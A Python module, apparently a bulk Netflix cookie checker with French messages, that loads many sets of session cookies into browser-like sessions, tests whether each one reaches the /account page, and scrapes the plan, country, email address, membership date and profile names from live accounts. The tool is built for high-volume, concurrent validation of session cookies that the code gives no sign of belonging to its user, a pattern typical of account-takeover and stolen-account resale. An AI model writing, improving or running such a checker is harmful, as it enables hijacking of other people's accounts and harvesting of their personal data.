"""Netflix cookie validation.

A cookie set is valid when ``/account`` answers 200 without being redirected to
``/login``. Sessions are pooled per thread and reused so keep-alive works across
checks, and a global semaphore caps outbound concurrency.
"""

from __future__ import annotations

import os
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Any, Iterable
from urllib.parse import urljoin, urlparse

import requests
from requests.adapters import HTTPAdapter

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)
BASE_URL = "https://www.netflix.com"
ACCOUNT_URL = f"{BASE_URL}/account"
PROFILES_URL = f"{BASE_URL}/profiles/manage"
BROWSE_URL = f"{BASE_URL}/browse"

CONNECT_TIMEOUT = float(os.environ.get("CHECK_CONNECT_TIMEOUT", "5"))
READ_TIMEOUT = float(os.environ.get("CHECK_READ_TIMEOUT", "12"))
MAX_WORKERS = max(1, int(os.environ.get("CHECK_WORKERS", "12")))
MAX_CONNECTIONS = max(1, int(os.environ.get("CHECK_MAX_CONNECTIONS", "24")))
MAX_REDIRECTS = 5
BODY_LIMIT = 900_000

REDIRECT_CODES = (301, 302, 303, 307, 308)
LOGIN_PATH_RE = re.compile(r"/login", re.IGNORECASE)
LOGIN_FORM_RE = re.compile(r'data-uia="login-form"', re.IGNORECASE)
PROFILE_MARKER_RE = re.compile(r"profile-gate-label|profiles/manage", re.IGNORECASE)

PLAN_PATTERNS = (
    re.compile(r'"(?:planName|localizedPlanName|currentPlan|plan)"\s*:\s*"([^"]{1,48})"'),
    re.compile(r'data-uia="plan-(?:card|name|title)[^"]*"[^>]*>\s*([^<]{1,48})<', re.IGNORECASE),
    re.compile(r'data-uia="[^"]*plan[^"]*"[^>]*>\s*([A-Za-z][^<]{1,40})<', re.IGNORECASE),
)
PLAN_FALLBACK_RE = re.compile(
    r"\b(Premium|Standard avec pub|Standard with ads|Standard|Essentiel|Basic|Mobile|Ads)\b"
)
COUNTRY_PATTERNS = (
    re.compile(r'"countryOfSignup"\s*:\s*"([A-Za-z]{2})"'),
    re.compile(r'"countryOfSignup"\s*:\s*\{\s*"id"\s*:\s*"([A-Za-z]{2})"'),
)
EMAIL_RE = re.compile(r'"(?:emailAddress|email|loginId)"\s*:\s*"([^"@\s]{1,64}@[^"\s]{1,96})"')
MEMBER_SINCE_RE = re.compile(r'"memberSince"\s*:\s*"?([0-9T:\-\.Z]{4,32})"?')
PROFILE_PATTERNS = (
    re.compile(r'"profileName"\s*:\s*"([^"]{1,40})"'),
    re.compile(r'data-uia="profile-name"[^>]*>\s*([^<]{1,40})<', re.IGNORECASE),
    re.compile(r'aria-label="([^"]{1,40})"\s+data-uia="profile-avatar"', re.IGNORECASE),
)

_local = threading.local()
_global_semaphore = threading.BoundedSemaphore(max(MAX_CONNECTIONS, MAX_WORKERS))


def _session() -> requests.Session:
    session = getattr(_local, "session", None)
    if session is None:
        session = requests.Session()
        adapter = HTTPAdapter(
            pool_connections=MAX_CONNECTIONS,
            pool_maxsize=MAX_CONNECTIONS,
            max_retries=0,
            pool_block=False,
        )
        session.mount("https://", adapter)
        session.mount("http://", adapter)
        session.headers.update(
            {
                "User-Agent": USER_AGENT,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "Upgrade-Insecure-Requests": "1",
            }
        )
        _local.session = session
    return session


def _reset_cookies(session: requests.Session, cookies: dict[str, str]) -> None:
    session.cookies.clear()
    for name, value in cookies.items():
        try:
            session.cookies.set(name, value, domain=".netflix.com", path="/")
        except (ValueError, TypeError):
            continue


def _get(session: requests.Session, url: str, follow: bool = True) -> tuple[requests.Response, str]:
    """GET with manual redirect handling so login bounces are observable."""
    current = url
    response = session.get(current, allow_redirects=False, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT))
    hops = 0
    while follow and response.status_code in REDIRECT_CODES and hops < MAX_REDIRECTS:
        location = response.headers.get("location") or response.headers.get("Location") or ""
        if not location:
            break
        current = urljoin(current, location)
        if "netflix.com" not in urlparse(current).netloc:
            break
        hops += 1
        response = session.get(current, allow_redirects=False, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT))
    return response, current


def _body(response: requests.Response) -> str:
    try:
        response.encoding = response.encoding or "utf-8"
        return response.text[:BODY_LIMIT]
    except (ValueError, UnicodeError):
        return ""


def _first_match(patterns: Iterable[re.Pattern[str]], text: str) -> str:
    for pattern in patterns:
        match = pattern.search(text)
        if match:
            value = (match.group(1) or "").strip()
            if value:
                return value[:64]
    return ""


def _normalise_plan(raw: str) -> str:
    if not raw:
        return ""
    cleaned = re.sub(r"\s+", " ", raw).strip(" .,:;-")
    return cleaned[:32]


def _profiles_from(text: str) -> list[str]:
    names: list[str] = []
    for pattern in PROFILE_PATTERNS:
        for match in pattern.finditer(text):
            name = (match.group(1) or "").strip()
            if name and name.lower() not in {item.lower() for item in names}:
                names.append(name[:40])
    return names[:20]


def _empty_result(account: Any) -> dict[str, Any]:
    return {
        "id": getattr(account, "index", 0),
        "label": getattr(account, "label", "Compte"),
        "valid": False,
        "status": "error",
        "plan": "",
        "country": "",
        "email": "",
        "member_since": "",
        "profiles": [],
        "profiles_count": 0,
        "http_status": 0,
        "final_path": "",
        "elapsed_ms": 0,
        "error": "",
        "cookies": dict(getattr(account, "cookies", {})),
    }


def check_one(account: Any) -> dict[str, Any]:
    """Validate one account. Never raises."""
    result = _empty_result(account)
    started = time.perf_counter()
    acquired = False
    try:
        _global_semaphore.acquire()
        acquired = True
        session = _session()
        _reset_cookies(session, result["cookies"])

        response, final_url = _get(session, ACCOUNT_URL)
        body = _body(response)
        result["http_status"] = response.status_code
        result["final_path"] = urlparse(final_url).path or "/"

        redirected_to_login = bool(LOGIN_PATH_RE.search(result["final_path"]))
        login_form = bool(LOGIN_FORM_RE.search(body))

        if response.status_code in REDIRECT_CODES or redirected_to_login or (login_form and response.status_code == 200):
            result["status"] = "invalid"
            result["error"] = "Cookie invalide ou expiré (redirection vers /login)"
            return result

        if response.status_code == 403:
            result["status"] = "error"
            result["error"] = "Accès refusé par Netflix (403)"
            return result

        if response.status_code == 429:
            result["status"] = "error"
            result["error"] = "Netflix limite le débit (429)"
            return result

        if response.status_code >= 400:
            result["status"] = "error"
            result["error"] = f"Réponse HTTP {response.status_code}"
            return result

        if response.status_code != 200 or len(body) < 500:
            result["status"] = "error"
            result["error"] = "Réponse inattendue de Netflix"
            return result

        result["valid"] = True
        result["status"] = "valid"

        plan = _first_match(PLAN_PATTERNS, body)
        if not plan:
            fallback = PLAN_FALLBACK_RE.search(body)
            plan = fallback.group(1) if fallback else ""
        result["plan"] = _normalise_plan(plan)
        result["country"] = _first_match(COUNTRY_PATTERNS, body).upper()
        result["email"] = _first_match((EMAIL_RE,), body)
        result["member_since"] = _first_match((MEMBER_SINCE_RE,), body)

        profiles = _profiles_from(body)
        if not profiles:
            try:
                profiles_response, _ = _get(session, PROFILES_URL)
                profiles = _profiles_from(_body(profiles_response))
            except requests.RequestException:
                profiles = []
        if not profiles:
            try:
                browse_response, _ = _get(session, BROWSE_URL)
                profiles = _profiles_from(_body(browse_response))
            except requests.RequestException:
                profiles = []
        result["profiles"] = profiles
        result["profiles_count"] = len(profiles)
        return result

    except requests.Timeout:
        result["status"] = "error"
        result["error"] = "Délai dépassé"
        return result
    except requests.RequestException as exc:
        result["status"] = "error"
        result["error"] = f"Erreur réseau: {exc.__class__.__name__}"
        return result
    except Exception as exc:  # noqa: BLE001 - a single account must never break the batch
        result["status"] = "error"
        result["error"] = f"Erreur interne: {exc.__class__.__name__}"
        return result
    finally:
        if acquired:
            _global_semaphore.release()
        result["elapsed_ms"] = int((time.perf_counter() - started) * 1000)


def check_many(accounts: list[Any]) -> list[dict[str, Any]]:
    """Check accounts concurrently, preserving input order."""
    if not accounts:
        return []
    workers = min(MAX_WORKERS, len(accounts))
    if workers == 1:
        return [check_one(account) for account in accounts]
    with ThreadPoolExecutor(max_workers=workers, thread_name_prefix="check") as pool:
        return list(pool.map(check_one, accounts))
